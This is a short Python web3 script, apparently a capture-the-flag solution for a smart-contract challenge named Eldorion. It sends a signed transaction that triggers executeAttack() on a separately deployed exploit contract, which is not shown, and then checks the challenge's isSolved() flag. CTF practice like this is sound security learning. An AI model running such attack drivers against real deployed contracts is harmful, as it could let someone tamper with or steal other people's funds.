from web3 import Web3

# Địa chỉ thử thách
RPC_URL = "http://94.237.57.194:49009"
TARGET_CONTRACT = "0xYourEldorionContractAddress"
EXPLOIT_CONTRACT = "0xYourExploitContractAddress"
PRIVATE_KEY = "0xYourPrivateKey"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

def send_transaction(to, data):
    nonce = w3.eth.get_transaction_count(account.address)
    tx = {
        'to': to,
        'value': 0,
        'gas': 300000,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
        'data': data
    }
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return w3.to_hex(tx_hash)

# ABI của Exploit contract (chỉ cần phần executeAttack)
EXPLOIT_ABI = '[{"inputs":[],"name":"executeAttack","outputs":[],"stateMutability":"nonpayable","type":"function"}]'
exploit_contract = w3.eth.contract(address=EXPLOIT_CONTRACT, abi=EXPLOIT_ABI)

tx_hash = send_transaction(EXPLOIT_CONTRACT, exploit_contract.encodeABI(fn_name="executeAttack"))
print(f"Exploit transaction sent: {tx_hash}")

# Kiểm tra flag
SETUP_CONTRACT = "0xYourSetupContractAddress"
SETUP_ABI = '[{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]'
setup_contract = w3.eth.contract(address=SETUP_CONTRACT, abi=SETUP_ABI)
solved = setup_contract.functions.isSolved().call()
print(f"Challenge solved: {solved}")